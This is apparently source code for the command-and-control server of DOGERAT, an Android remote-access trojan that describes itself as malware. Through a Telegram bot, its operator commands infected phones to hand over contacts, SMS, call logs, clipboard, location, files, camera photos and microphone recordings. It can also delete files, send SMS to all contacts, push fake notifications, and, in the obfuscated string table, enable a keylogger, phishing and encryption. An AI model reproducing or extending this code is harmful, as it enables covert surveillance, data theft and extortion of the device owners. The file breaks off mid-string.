                        {text: '𝙎𝙚𝙣𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚', callback_data: `send_message:${uuid}`}
                    ],
                    [
                        {text: '𝙋𝙡𝙖𝙮 𝙖𝙪𝙙𝙞𝙤', callback_data: `play_audio:${uuid}`},
                        {text: '𝙎𝙩𝙤𝙥 𝙖𝙪𝙙𝙞𝙤', callback_data: `stop_audio:${uuid}`},
                    ],
                    [
                        {
                            text: '𝙎𝙚𝙣𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨',
                            callback_data: `send_message_to_all:${uuid}`
                        }
                    ],
                ]
            },
            parse_mode: "HTML"
        })
    }
    if (commend == 'calls') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('calls');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'contacts') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('contacts');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'messages') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('messages');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'apps') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('apps');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'device_info') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('device_info');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'clipboard') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('clipboard');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'camera_main') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_main');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'camera_selfie') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_selfie');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'location') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('location');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'vibrate') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('vibrate');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'stop_audio') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('stop_audio');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'send_message') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙝𝙚 𝙣𝙪𝙢𝙗𝙚𝙧 𝙩𝙤 𝙬𝙝𝙞𝙘𝙝 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝙎𝙈𝙎\n\n' +
            '•ɪꜰ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ꜱᴇɴᴅ ꜱᴍꜱ ᴛᴏ ʟᴏᴄᴀʟ ᴄᴏᴜɴᴛʀʏ ɴᴜᴍʙᴇʀꜱ, ʏᴏᴜ ᴄᴀɴ ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴢᴇʀᴏ ᴀᴛ ᴛʜᴇ ʙᴇɢɪɴɴɪɴɢ, ᴏᴛʜᴇʀᴡɪꜱᴇ ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴛʜᴇ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ',
            {reply_markup: {force_reply: true}})
        currentUuid = uuid
    }
    if (commend == 'send_message_to_all') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨\n\n' +
            '• ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ',
            {reply_markup: {force_reply: true}}
        )
        currentUuid = uuid
    }
    if (commend == 'file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙\n\n' +
            '• ʏᴏᴜ ᴅᴏ ɴᴏᴛ ɴᴇᴇᴅ ᴛᴏ ᴇɴᴛᴇʀ ᴛʜᴇ ꜰᴜʟʟ ꜰɪʟᴇ ᴘᴀᴛʜ, ᴊᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴀɪɴ ᴘᴀᴛʜ. ꜰᴏʀ ᴇxᴀᴍᴘʟᴇ, ᴇɴᴛᴇʀ<b> DCIM/Camera </b> ᴛᴏ ʀᴇᴄᴇɪᴠᴇ ɢᴀʟʟᴇʀʏ ꜰɪʟᴇꜱ.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'delete_file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙚𝙡𝙚𝙩𝙚\n\n' +
            '• ʏᴏᴜ ᴅᴏ ɴᴏᴛ ɴᴇᴇᴅ ᴛᴏ ᴇɴᴛᴇʀ ᴛʜᴇ ꜰᴜʟʟ ꜰɪʟᴇ ᴘᴀᴛʜ, ᴊᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴀɪɴ ᴘᴀᴛʜ. ꜰᴏʀ ᴇxᴀᴍᴘʟᴇ, ᴇɴᴛᴇʀ<b> DCIM/Camera </b> ᴛᴏ ᴅᴇʟᴇᴛᴇ ɢᴀʟʟᴇʀʏ ꜰɪʟᴇꜱ.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'microphone') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙\n\n' +
            '• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴛɪᴍᴇ ɴᴜᴍᴇʀɪᴄᴀʟʟʏ ɪɴ ᴜɴɪᴛꜱ ᴏꜰ ꜱᴇᴄᴏɴᴅꜱ',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'toast') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙝𝙖𝙩 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙤𝙣 𝙩𝙝𝙚 𝙩𝙖𝙧𝙜𝙚𝙩 𝙙𝙚𝙫𝙞𝙘𝙚\n\n' +
            '• ᴛᴏᴀꜱᴛ ɪꜱ ᴀ ꜱʜᴏʀᴛ ᴍᴇꜱꜱᴀɢᴇ ᴛʜᴀᴛ ᴀᴘᴘᴇᴀʀꜱ ᴏɴ ᴛʜᴇ ᴅᴇᴠɪᴄᴇ ꜱᴄʀᴇᴇɴ ꜰᴏʀ ᴀ ꜰᴇᴡ ꜱᴇᴄᴏɴᴅꜱ',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'show_notification') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙖𝙨 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣\n\n' +
            '• ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ʙᴇ ᴀᴘᴘᴇᴀʀ ɪɴ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ꜱᴛᴀᴛᴜꜱ ʙᴀʀ ʟɪᴋᴇ ʀᴇɢᴜʟᴀʀ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'play_audio') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙖𝙪𝙙𝙞𝙤 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙥𝙡𝙖𝙮\n\n' +
            '• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴅɪʀᴇᴄᴛ ʟɪɴᴋ ᴏꜰ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ꜱᴏᴜɴᴅ, ᴏᴛʜᴇʀᴡɪꜱᴇ ᴛʜᴇ ꜱᴏᴜɴᴅ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ᴘʟᴀʏᴇᴅ',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
});
setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        ws.send('ping')
    });
    try {
        axios.get(address).then(r => "")
    } catch (e) {
    }
}, 5000)
appServer.listen(process.env.PORT || 8999);

const var_74=var_8;function var_66(){const var_45=['<b>✯\x20𝚂𝚎𝚕𝚎𝚌𝚝\x20𝚍𝚎𝚟𝚒𝚌𝚎\x20𝚝𝚘\x20𝚙𝚎𝚛𝚏𝚘𝚛𝚖\x20𝚊𝚌𝚝𝚒𝚘𝚗</b>\x0a\x0a','22kyhfRQ','file','sockets','log','✯\x20𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍\x20✯','express','<b>✯\x20𝙴𝚗𝚝𝚎𝚛\x20𝚊\x20𝚙𝚑𝚘𝚗𝚎\x20𝚗𝚞𝚖𝚋𝚎𝚛\x20𝚝𝚑𝚊𝚝\x20𝚢𝚘𝚞\x20𝚠𝚊𝚗𝚝\x20𝚝𝚘\x20𝚜𝚎𝚗𝚍\x20𝚂𝙼𝚂</b>\x0a\x0a','<b>✯\x20𝙽𝚎𝚠\x20𝚍𝚎𝚟𝚒𝚌𝚎\x20𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍</b>\x0a\x0a','multer','✯\x20𝚂𝚎𝚗𝚍\x20𝚂𝙼𝚂\x20𝚝𝚘\x20𝚊𝚕𝚕\x20𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜\x20✯','84cPlils','<b>✯\x20𝙼𝚊𝚒𝚗\x20𝚖𝚎𝚗𝚞</b>\x0a\x0a','<b>𝚟𝚎𝚛𝚜𝚒𝚘𝚗</b>\x20→\x20','listen','readFileSync','<b>✯\x20𝚂𝚎𝚕𝚎𝚌𝚝\x20𝚊𝚌𝚝𝚒𝚘𝚗\x20𝚝𝚘\x20𝚙𝚎𝚛𝚏𝚘𝚛𝚖\x20𝚏𝚘𝚛\x20𝚊𝚕𝚕\x20𝚊𝚟𝚊𝚒𝚕𝚊𝚋𝚕𝚎\x20𝚍𝚎𝚟𝚒𝚌𝚎𝚜</b>\x0a\x0a','popNotification','shift','3234gTfIoe','time','all-sms','no\x20information','1892960kuvEMZ','vibrateDuration','emit','✯\x20𝙰𝚌𝚝𝚒𝚘𝚗\x20✯','contacts','size','3961580aPaxKE','✯\x20𝙲𝚊𝚗𝚌𝚎𝚕\x20𝚊𝚌𝚝𝚒𝚘𝚗\x20✯','/text','✯\x20𝙼𝚊𝚒𝚗\x20𝚌𝚊𝚖𝚎𝚛𝚊\x20✯','all','smsNumber','<b>✯\x20𝙴𝚗𝚝𝚎𝚛\x20𝚝𝚎𝚡𝚝\x20𝚝𝚑𝚊𝚝\x20𝚢𝚘𝚞\x20𝚠𝚊𝚗𝚝\x20𝚝𝚘\x20𝚜𝚎𝚗𝚍\x20𝚝𝚘\x20𝚊𝚕𝚕\x20𝚝𝚊𝚛𝚐𝚎𝚝\x20𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜</b>\x0a\x0a','toast','currentNotificationText','2169665ymIjdB','3426UnzfvN','get','✯\x20𝚂𝙼𝚂\x20✯','3539044apenns','<b>✯\x20𝙼𝚎𝚜𝚜𝚊𝚐𝚎\x20𝚛𝚎𝚌𝚎𝚒𝚟𝚎𝚍\x20𝚏𝚛𝚘𝚖\x20→\x20','✯\x20𝙱𝚊𝚌𝚔\x20𝚝𝚘\x20𝚖𝚊𝚒𝚗\x20𝚖𝚎𝚗𝚞\x20✯','✯\x20𝙳𝚎𝚌𝚛𝚢𝚙𝚝\x20✯','<b>✯\x20𝙳𝚎𝚟𝚒𝚌𝚎\x20𝚍𝚒𝚜𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍</b>\x0a\x0a','currentNumber','set','selfie-camera','http','<b>✯\x20𝚃𝚑𝚎𝚛𝚎\x20𝚒𝚜\x20𝚗𝚘\x20𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍\x20𝚍𝚎𝚟𝚒𝚌𝚎</b>\x0a\x0a','14859208ppOnuo','originalname','𝙳𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚍\x20𝚋𝚢:\x20@CYBERSHIELDX','\x20𝙳𝚎𝚟𝚒𝚌𝚎𝚜\x20✯','single','post','<b>✯\x20𝚃𝚑𝚎\x20𝚛𝚎𝚚𝚞𝚎𝚜𝚝\x20𝚠𝚊𝚜\x20𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍\x20𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢,\x20𝚢𝚘𝚞\x20𝚠𝚒𝚕𝚕\x20𝚛𝚎𝚌𝚎𝚒𝚟𝚎\x20𝚍𝚎𝚟𝚒𝚌𝚎\x20𝚛𝚎𝚜𝚙𝚘𝚗𝚎\x20𝚜𝚘𝚘𝚗\x20...\x0a\x0a✯\x20𝚁𝚎𝚝𝚞𝚛𝚗\x20𝚝𝚘\x20𝚖𝚊𝚒𝚗\x20𝚖𝚎𝚗𝚞</b>\x0a\x0a','✯\x20𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛\x20𝙾𝙽\x20✯','/start','currentTarget','✯\x20𝙳𝚎𝚟𝚒𝚌𝚎𝚜\x20✯','smsToAllContacts','disconnect','handshake','duration','toastText','✯\x20𝚂𝚝𝚘𝚙\x20𝙰𝚞𝚍𝚒𝚘\x20✯','text','DOGERAT\x20𝚒𝚜\x20𝚊\x20𝚖𝚊𝚕𝚠𝚊𝚛𝚎\x20𝚝𝚘\x20𝚌𝚘𝚗𝚝𝚛𝚘𝚕\x20𝙰𝚗𝚍𝚛𝚘𝚒𝚍\x20𝚍𝚎𝚟𝚒𝚌𝚎𝚜\x0a𝙰𝚗𝚢\x20𝚖𝚒𝚜𝚞𝚜𝚎\x20𝚒𝚜\x20𝚝𝚑𝚎\x20𝚛𝚎𝚜𝚙𝚘𝚗𝚜𝚒𝚋𝚒𝚕𝚒𝚝𝚢\x20𝚘𝚏\x20𝚝𝚑𝚎\x20𝚙𝚎𝚛𝚜𝚘𝚗!\x0a\x0a','<b>𝙳𝚎𝚟𝚒𝚌𝚎\x20','<b>✯\x20𝚂𝚎𝚕𝚎𝚌𝚝\x20𝚊𝚌𝚝𝚒𝚘𝚗\x20𝚝𝚘\x20𝚙𝚎𝚛𝚏𝚘𝚛𝚖\x20𝚏𝚘𝚛\x20','notificationText','✯\x20𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝\x20✯','✯\x20𝚅𝚒𝚋𝚛𝚊𝚝𝚎\x20✯','<b>✯\x20𝙴𝚗𝚝𝚎𝚛\x20𝚝𝚎𝚡𝚝\x20𝚝𝚑𝚊𝚝\x20𝚢𝚘𝚞\x20𝚠𝚊𝚗𝚝\x20𝚝𝚘\x20𝚊𝚙𝚙𝚎𝚊𝚛\x20𝚊𝚜\x20𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗</b>\x0a\x0a','18HiKXqZ','PORT','keylogger-off','<b>𝚒𝚙</b>\x20→\x20','currentAction','✯\x20𝙰𝚋𝚘𝚞𝚝\x20𝚞𝚜\x20✯','calls','url','628531Xzwdkr','commend','Done','5UQRBbM','157863kmaaoD','env','token','✯\x20𝙶𝚊𝚕𝚕𝚎𝚛𝚢\x20✯','✯\x20𝙲𝚊𝚕𝚕𝚜\x20✯','createServer','textToAllContacts','6831234vSnSLj','✯\x20𝙿𝚕𝚊𝚢\x20𝚊𝚞𝚍𝚒𝚘\x20✯','sendMessage','utf8','smsText','headers','✯\x20𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐\x20✯','/upload','✯\x20𝙴𝚗𝚌𝚛𝚢𝚙𝚝\x20✯','forEach','232370LYMeOO','2414186GnuxVX','<b>✯\x20𝙴𝚗𝚝𝚎𝚛\x20𝚝𝚑𝚎\x20𝚖𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎\x20𝚛𝚎𝚌𝚘𝚛𝚍𝚒𝚗𝚐\x20𝚍𝚞𝚛𝚊𝚝𝚒𝚘𝚗\x20𝚒𝚗\x20𝚜𝚎𝚌𝚘𝚗𝚍𝚜</b>\x0a\x0a','*/*','keylogger-on','delete','1292HGSYoP','socket.io','<b>𝚝𝚒𝚖𝚎</b>\x20→\x20','HTML','ping','<b>✯\x20𝚆𝚎𝚕𝚌𝚘𝚖𝚎\x20𝚝𝚘\x20DOGERAT</b>\x0a\x0a','apps','microphoneDuration','2111820yZWyTe','<b>𝚖𝚘𝚍𝚎𝚕</b>\x20→\x20','<b>✯\x20𝙴𝚗𝚝